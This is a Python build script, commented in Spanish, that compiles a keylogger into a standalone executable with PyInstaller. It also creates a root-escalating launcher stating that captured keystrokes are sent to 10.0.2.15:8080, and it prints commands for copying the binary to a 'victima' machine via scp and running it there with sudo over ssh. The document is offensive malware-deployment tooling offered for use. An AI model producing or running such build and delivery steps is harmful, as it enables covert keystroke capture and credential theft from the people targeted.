#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import shutil

def install_pyinstaller():
    """instala pyinstaller si no esta disponible, maneja entornos gestionados"""
    import importlib.util
    
    # verificar si ya esta instalado
    if importlib.util.find_spec("PyInstaller") is not None:
        print("pyinstaller ya esta instalado")
        return True, sys.executable
    
    print("instalando pyinstaller...")
    
    # metodo 1: apt + dependencias completas (debian/ubuntu/parrot)
    if shutil.which("apt"):
        print("detectado sistema debian/ubuntu, instalando dependencias completas...")
        try:
            # instalar todas las dependencias necesarias
            subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True, text=True)
            subprocess.run([
                "sudo", "apt", "install", "-y", 
                "python3-pip", "python3-dev", "python3-setuptools",
                "build-essential", "binutils", "upx-ucl"
            ], check=True)
            
            # intentar pyinstaller via apt
            try:
                subprocess.run(["sudo", "apt", "install", "-y", "python3-pyinstaller"], check=True)
                print("pyinstaller instalado via apt")
                return True, "pyinstaller"
            except subprocess.CalledProcessError:
                print("apt pyinstaller fallo, usando pip...")
                
        except subprocess.CalledProcessError as e:
            print(f"error instalando dependencias: {e}")
    
    # metodo 2: entorno virtual aislado (mas confiable)
    print("creando entorno virtual aislado...")
    try:
        venv_path = "build_venv"
        if os.path.exists(venv_path):
            shutil.rmtree(venv_path)
            
        subprocess.run([sys.executable, "-m", "venv", venv_path], check=True)
        
        if os.name == 'nt':  # windows
            pip_path = os.path.join(venv_path, "Scripts", "pip")
            python_path = os.path.join(venv_path, "Scripts", "python")
            pyinstaller_path = os.path.join(venv_path, "Scripts", "pyinstaller")
        else:  # unix/linux
            pip_path = os.path.join(venv_path, "bin", "pip")
            python_path = os.path.join(venv_path, "bin", "python")
            pyinstaller_path = os.path.join(venv_path, "bin", "pyinstaller")
        
        # instalar en entorno virtual
        subprocess.run([pip_path, "install", "--upgrade", "pip"], check=True)
        subprocess.run([pip_path, "install", "pyinstaller"], check=True)
        
        print("pyinstaller instalado en entorno virtual")
        return True, pyinstaller_path
        
    except subprocess.CalledProcessError as e:
        print(f"error con entorno virtual: {e}")
    
    # metodo 3: pip con --break-system-packages
    try:
        print("intentando pip con --break-system-packages...")
        subprocess.run([
            sys.executable, "-m", "pip", "install", 
            "--break-system-packages", "pyinstaller"
        ], check=True)
        print("pyinstaller instalado con --break-system-packages")
        return True, f"{sys.executable} -m PyInstaller"
    except subprocess.CalledProcessError:
        print("pip --break-system-packages fallo")
    
    # metodo 4: pip normal (ultima opcion)
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
        print("pyinstaller instalado con pip normal")
        return True, f"{sys.executable} -m PyInstaller"
    except subprocess.CalledProcessError:
        pass
    
    print("error: no se pudo instalar pyinstaller con ningun metodo")
    return False, None

def build_executable():
    """compila el keylogger a ejecutable"""
    print("compilando keylogger...")
    
    # limpiar compilaciones anteriores
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists("keylogger.spec"):
        os.remove("keylogger.spec")
    if os.path.exists("build_venv"):
        print("limpiando entorno virtual...")
        shutil.rmtree("build_venv")
    
    # instalar pyinstaller
    success, pyinstaller_cmd = install_pyinstaller()
    if not success:
        print("error: no se pudo instalar pyinstaller")
        return False
    
    # comando de compilacion robusto
    if isinstance(pyinstaller_cmd, str) and pyinstaller_cmd.endswith("pyinstaller"):
        # comando directo
        cmd = [pyinstaller_cmd]
    else:
        # comando python -m
        cmd = pyinstaller_cmd.split()
    
    cmd.extend([
        "--onefile",
        "--console", 
        "--name=keylogger",
        "--add-data=reconstructor.py:.",
        "--hidden-import=pynput",
        "--hidden-import=pynput.keyboard",
        "--hidden-import=pynput.mouse",
        "--hidden-import=requests",
        "--hidden-import=urllib3",
        "--hidden-import=json",
        "--hidden-import=base64",
        "--hidden-import=socket",
        "--clean",
        "--noconfirm",
        "unified_keylogger.py"
    ])
    
    try:
        print(f"ejecutando: {' '.join(cmd)}")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        if os.path.exists("dist/keylogger"):
            print("\n" + "="*50)
            print("ejecutable creado exitosamente")
            print("="*50)
            print("ubicacion: dist/keylogger")
            print("uso: sudo ./dist/keylogger")
            print("tamaño:", get_file_size("dist/keylogger"))
            print("="*50)
            
            # limpiar entorno virtual si se uso
            if os.path.exists("build_venv"):
                shutil.rmtree("build_venv")
                print("entorno virtual temporal eliminado")
            
            return True
        else:
            print("error: ejecutable no se creo")
            return False
            
    except subprocess.CalledProcessError as e:
        print(f"error compilando: {e}")
        if e.stdout:
            print(f"stdout: {e.stdout}")
        if e.stderr:
            print(f"stderr: {e.stderr}")
        return False

def get_file_size(filepath):
    """obtiene el tamaño del archivo"""
    try:
        size = os.path.getsize(filepath)
        if size < 1024:
            return f"{size} bytes"
        elif size < 1024*1024:
            return f"{size/1024:.1f} KB"
        else:
            return f"{size/(1024*1024):.1f} MB"
    except:
        return "desconocido"

def create_launcher():
    """crea script de lanzamiento opcional"""
    launcher_content = """#!/bin/bash
# lanzador automatico del keylogger

echo "keylogger compilado"
echo "=================="

# verificar si el ejecutable existe
if [ ! -f "dist/keylogger" ]; then
    echo "error: ejecutable no encontrado"
    echo "ejecuta primero: python build_keylogger.py"
    exit 1
fi

# verificar permisos de root
if [ "$EUID" -ne 0 ]; then
    echo "necesitas permisos de administrador"
    echo "relanzando con sudo..."
    exec sudo "$0" "$@"
fi

echo "iniciando keylogger..."
echo "configurado para enviar a: 10.0.2.15:8080"
echo "presiona ctrl+c para detener"
echo ""

# ejecutar keylogger
./dist/keylogger

echo ""
echo "keylogger detenido"
read -p "presiona enter para salir..."
"""
    
    with open("run_keylogger.sh", "w") as f:
        f.write(launcher_content)
    
    os.chmod("run_keylogger.sh", 0o755)
    print("script de lanzamiento creado: run_keylogger.sh")

def main():
    print("compilador de keylogger")
    print("======================")
    print("")
    
    # verificar archivos necesarios
    required_files = ["unified_keylogger.py", "reconstructor.py"]
    for file in required_files:
        if not os.path.exists(file):
            print(f"error: {file} no encontrado")
            return
    
    # instalar pyinstaller y compilar
    if build_executable():
        create_launcher()
        print("\ncompilacion completada exitosamente")
        print("opciones de ejecucion:")
        print("1. sudo ./dist/keylogger")
        print("2. sudo ./run_keylogger.sh")
        print("\ntransferencia a victima:")
        print("scp dist/keylogger usuario@victima:/tmp/")
        print("ssh usuario@victima 'sudo /tmp/keylogger'")
    else:
        print("error en la compilacion")
        print("\nalternativas:")
        print("1. usar: chmod +x keylogger_auto.sh && sudo ./keylogger_auto.sh")
        print("2. instalar manualmente: sudo apt install python3-pyinstaller")

if __name__ == "__main__":
    main()
